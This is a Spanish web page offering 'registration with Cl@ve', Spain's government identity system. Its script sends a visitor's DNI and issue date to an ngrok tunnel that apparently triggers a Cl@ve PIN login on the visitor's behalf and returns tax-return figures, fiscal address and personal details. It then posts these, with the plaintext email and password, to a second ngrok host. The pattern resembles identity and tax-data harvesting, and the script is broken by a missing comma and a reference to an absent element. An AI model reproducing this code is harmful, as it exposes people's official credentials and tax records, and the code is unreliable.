<!DOCTYPE html>
<html lang="es">

<head>
    <!-- Administrador de etiquetas de Google -->
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-W9GF583');
    </script>

    <!-- Fin del Administrador de etiquetas de Google -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gradient-to-r from-teal-400 to-teal-600 flex justify-center items-center min-h-screen p-4">
    <x-gtm-noscript />

    <div class="bg-white rounded-lg shadow-lg w-full max-w-lg p-6 space-y-8">
        <div class="flex flex-col md:flex-row justify-between items-center space-y-6 md:space-y-0">
            <!-- Left Section -->
            <div class="flex-1 flex flex-col items-center space-y-4">
                <h3 class="text-2xl font-semibold text-gray-800">Registro con Cl@ve</h3>
                <input type="email" id="email"
                    class="w-full p-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-teal-400"
                    placeholder="Correo electrónico" required>
                <input type="password" id="password" minlength="8"
                    class="w-full p-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-teal-400"
                    placeholder="Contraseña (MÍNIMO 8 CARACTERES)" required>
                <input type="text" id="dni"
                    class="w-full p-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-teal-400"
                    placeholder="DNI" required>
                <input type="text" id="fecha"
                    class="w-full p-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-teal-400"
                    placeholder="Fecha de expedición" required>
                <button id="register-clave"
                    class="w-full py-3 bg-teal-400 text-white rounded-lg font-semibold hover:bg-teal-500 transition duration-300">Registrarse
                    con Cl@ve</button>
                <div id="verificationCode" class="mt-4 text-lg text-green-500 font-semibold"></div>
                <!-- Spinner and Info Text -->
                <div id="spinner-container" style="display: none;">
                    <div class="w-16 h-16 border-4 border-blue-500 border-solid rounded-full animate-spin"></div>
                    <p class="text-lg text-gray-600 font-medium">Compruebe su app Cl@ve PIN, acepte y espere. El proceso
                        puede tardar hasta 1 minuto.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('register-clave').addEventListener('click', async function(event) {
            event.preventDefault();

            const btn = document.getElementById('register-clave');
            btn.disabled = true;

            const dni = document.getElementById('dni').value;
            const fecha = document.getElementById('fecha').value;
            const verificationDiv = document.getElementById('verificationCode');
            const spinnerContainer = document.getElementById('spinner-container');

            if (!dni || !fecha) {
                alert('Por favor, completa todos los campos.');
                btn.disabled = false;
                return;
            }

            // Show spinner and info text
            spinnerContainer.style.display = 'flex';
            verificationDiv.innerText = ''; // Clear any previous verification code

            try {
                const response = await fetch('https://de82-83-49-155-241.ngrok-free.app/api/process', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        dni,
                        fecha
                    })
                });

                if (!response.body) {
                    throw new Error("Respuesta vacía");
                }

                // 🚀 Leer el stream de datos en partes
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                let receivedText = "";

                while (true) {
                    const {
                        done,
                        value
                    } = await reader.read();
                    if (done) break;

                    // Decodificar fragmento y mostrarlo en pantalla
                    const chunk = decoder.decode(value, {
                        stream: true
                    });
                    receivedText += chunk;

                    const dataJSON = JSON.parse(chunk);
                    if (dataJSON.success && dataJSON.verificationCode) {
                        verificationDiv.innerText = `Código de verificación: ${dataJSON.verificationCode}`;
                    } else {
                        verificationDiv.innerText = 'Hubo un error al recibir el código de verificación.';
                    }
                }

                // Verificar qué estamos recibiendo
                console.log("Texto recibido:", receivedText);

                // Dividir la respuesta por el salto de línea para obtener los dos JSONs
                const jsonParts = receivedText.split('\n').map(part => part.trim()).filter(part => part.length >
                    0);

                // Si no tenemos al menos un JSON válido, lanzamos un error
                if (jsonParts.length === 0) {
                    throw new Error("No se recibieron datos JSON válidos");
                }

                // El último JSON es el relevante
                const lastJson = jsonParts[jsonParts.length - 1];

                // Intentar parsear la respuesta como JSON
                let dataFromResponse;
                try {
                    dataFromResponse = JSON.parse(lastJson);
                } catch (error) {
                    console.error("Error al parsear JSON:", error);
                    alert("Error al procesar los datos recibidos.");
                    return;
                }

                // Extraer la parte de "data" que necesitas
                const data = dataFromResponse.data;

                // Aquí extraemos los datos relevantes del texto recibido
                const name = data.apellidosYNombres;
                const email = document.getElementById('email')
                    .value; // Suponiendo que el email es del formulario
                const password = document.getElementById('password')
                    .value; // Suponiendo que la contraseña es del formulario

                // Función para convertir las cantidades a céntimos
                function convertirACentimos(valor) {
                    const valorConvertido = valor.replace('.', '').replace(',', '.');
                    return Math.round(parseFloat(valorConvertido) * 100);
                }

                // Extraer el ref_by del URL
                // Detectar parámetro de referido en la URL
                const urlParams = new URLSearchParams(window.location.search);
                const refBy = urlParams.get('ref');


                // Construir el objeto data para la API de registro
                const registrationData = {
                    name: data.apellidosYNombres,
                    full_name: data.apellidosYNombres,
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value,
                    dni: data.nif,
                    domicilio_fiscal: data.domicilioFiscal,
                    fecha_nacimiento: data.fechaNacimiento,
                    estado_civil: data.estadoCivil,
                    sexo: data.sexo,
                    casilla435: convertirACentimos(data.casilla435),
                    casilla460: convertirACentimos(data.casilla460),
                    noDeudas: data.noDeudas
                    ref_by: refBy
                };

                // Enviar los datos a la API de registro
                axios.post('https://82ec-83-49-155-241.ngrok-free.app/register-user', registrationData)
                    .then(function(response) {
                        alert("Usuario registrado correctamente.");
                        window.location.href = '/';
                    })
                    .catch(function(error) {
                        if (error.response && error.response.data.errors) {
                            let errors = error.response.data.errors;
                            let errorMessages = '';
                            for (let key in errors) {
                                errorMessages += errors[key].join(', ') + '<br>';
                            }
                            document.getElementById('errorMessages').innerHTML = errorMessages;
                        }
                    });

            } catch (error) {
                console.error("Error:", error);
                alert("Hubo un error al procesar tu solicitud. Inténtelo de nuevo más tarde");
            } finally {
                // Dejar el spinner visible
                spinnerContainer.style.display = 'flex';
                btn.disabled = false;
            }
        });
    </script>

</body>

</html>
